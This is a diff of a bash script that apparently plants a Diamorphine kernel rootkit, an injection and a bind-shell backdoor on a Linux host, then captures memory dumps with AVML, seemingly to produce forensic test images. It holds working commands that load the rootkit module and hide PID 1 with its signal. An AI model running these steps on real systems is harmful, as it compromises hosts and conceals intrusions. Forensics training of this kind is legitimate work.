@@ -15,14 +15,24 @@ FLAG_BACKDOOR="/tmp/.backdoor_active"
 AVML_PATH="/tmp/avml"
 AVML_URL="https://github.com/microsoft/avml/releases/download/v0.14.0/avml"
 
-# Locate the pre‑built rootkit module relative to this script
 SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
 MODULE_PATH="$SCRIPT_DIR/assets/diamorphine.ko"
 
-# --- Install helpers ---
+# --- Helpers ---
+is_module_active() {
+    # Returns true if the module is loaded (hidden or not)
+    [ -d "/sys/module/${ROOTKIT_MODULE}" ]
+}
+
 install_rootkit() {
     if [ -f "$FLAG_ROOTKIT" ]; then
-        echo "[*] Rootkit already installed."
+        echo "[*] Rootkit already installed (flag)."
+        return 0
+    fi
+    if is_module_active; then
+        echo "[*] Rootkit appears to be already loaded (detected via /sys)."
+        # Ensure flag is set so status shows correct state
+        touch "$FLAG_ROOTKIT"
         return 0
     fi
 
@@ -32,12 +42,8 @@ install_rootkit() {
         exit 1
     fi
 
-    # Load the module only if it is not already in the kernel
-    if ! lsmod | grep -q "^${ROOTKIT_MODULE} "; then
-        sudo insmod "$MODULE_PATH"
-    fi
-
-    sudo kill -31 1   # hide PID 1 (Diamorphine magic signal)
+    sudo insmod "$MODULE_PATH"
+    sudo kill -31 1   # hide PID 1
     touch "$FLAG_ROOTKIT"
     echo "[+] Rootkit loaded (pre‑built)."
 }
@@ -82,10 +88,12 @@ install_backdoor() {
     echo "[+] Bind shell on port $BACKDOOR_PORT"
 }
 
-# --- Clean helpers ---
 clean_rootkit() {
-    lsmod | grep -q "^${ROOTKIT_MODULE} " && sudo rmmod "$ROOTKIT_MODULE" 2>/dev/null || true
+    # Try removing even if hidden (uses force & ignores errors)
+    sudo rmmod "$ROOTKIT_MODULE" 2>/dev/null || \
+    [ -d "/sys/module/${ROOTKIT_MODULE}" ] && sudo rmmod --force "$ROOTKIT_MODULE" 2>/dev/null || true
     rm -f "$FLAG_ROOTKIT"
+    echo "[+] Rootkit removed (if loaded)."
 }
 
 clean_injection() {
@@ -103,13 +111,11 @@ clean_backdoor() {
     rm -f "$FLAG_BACKDOOR"
 }
 
-# Parse comma-separated components
 parse_components() {
     local input="$1"
     [ "$input" = "all" ] && echo "rootkit injection backdoor" || echo "${input//,/ }"
 }
 
-# Return currently active component names based on flag files
 active_components() {
     local comps=()
     [ -f "$FLAG_ROOTKIT" ] && comps+=("rootkit")
@@ -119,23 +125,18 @@ active_components() {
     echo "${comps[@]}"
 }
 
-# Download AVML if not already present
 ensure_avml() {
-    if [ -f "$AVML_PATH" ]; then
-        return 0
-    fi
+    if [ -f "$AVML_PATH" ]; then return 0; fi
     echo "[*] Downloading AVML..."
     wget -q "$AVML_URL" -O "$AVML_PATH"
     chmod +x "$AVML_PATH"
     echo "[+] AVML ready at $AVML_PATH"
 }
 
-# Capture memory and name the dump appropriately
 capture_memory() {
     ensure_avml
     local timestamp=$(date +%Y%m%d_%H%M%S)
     local comps=( $(active_components) )
-    # Join array with underscores
     local IFS=_
     local name="memdump_${timestamp}_${comps[*]}.raw"
     echo "[*] Capturing memory to $name ..."
@@ -173,14 +174,10 @@ while getopts "icsC:a" opt; do
     esac
 done
 
-if [ -z "$ACTION" ]; then
-    echo "$USAGE"
-    exit 1
-fi
+[ -z "$ACTION" ] && { echo "$USAGE"; exit 1; }
 
 COMP_LIST=$(parse_components "$COMPONENTS")
 
-# Perform the primary action
 if [ "$ACTION" = "status" ]; then
     show_status
 elif [ "$ACTION" = "infect" ]; then
@@ -205,7 +202,6 @@ elif [ "$ACTION" = "clean" ]; then
     echo "[+] Cleanup complete."
 fi
 
-# If -a was given, capture memory after the action
 if $CAPTURE; then
     capture_memory
 fi
